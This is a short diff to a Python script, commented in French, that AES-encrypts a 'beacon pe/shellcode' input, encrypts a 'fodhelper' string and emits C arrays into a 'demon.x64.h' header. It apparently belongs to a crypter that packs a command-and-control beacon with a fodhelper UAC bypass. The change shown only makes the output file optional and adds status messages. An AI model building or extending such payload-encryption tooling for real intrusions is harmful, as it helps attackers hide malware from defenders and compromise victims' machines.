@@ -74,8 +74,12 @@ def encrypt_with_seed(input_file, output_file):
 
     print(preview_hex(fodhelper_enc, "[+] fodhelper_enc"))  # ← 48b maintenant !
 
-    with open(output_file, 'wb') as f:
-        f.write(final_payload)
+    if output_file:
+        with open(output_file, 'wb') as f:
+            f.write(final_payload)
+        print(f"[+] Payload écrit dans {output_file}")
+    else:
+        print("[*] Pas de fichier output, demon.x64.h créé uniquement")
 
     payload_array = format_c_array(final_payload)
     fod_array = format_c_array(fodhelper_enc)
@@ -109,7 +113,7 @@ static const size_t fodhelper_enc_len = {len(fodhelper_enc)};
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description='aes encryption')
     parser.add_argument('-i', '--input', required=True, help='beacon pe/shellcode')
-    parser.add_argument('-o', '--output', required=True, help='payload chiffré')
+    parser.add_argument('-o', '--output', required=False, help='payload chiffré (optionnel)')
     args = parser.parse_args()
 
     success = encrypt_with_seed(args.input, args.output)
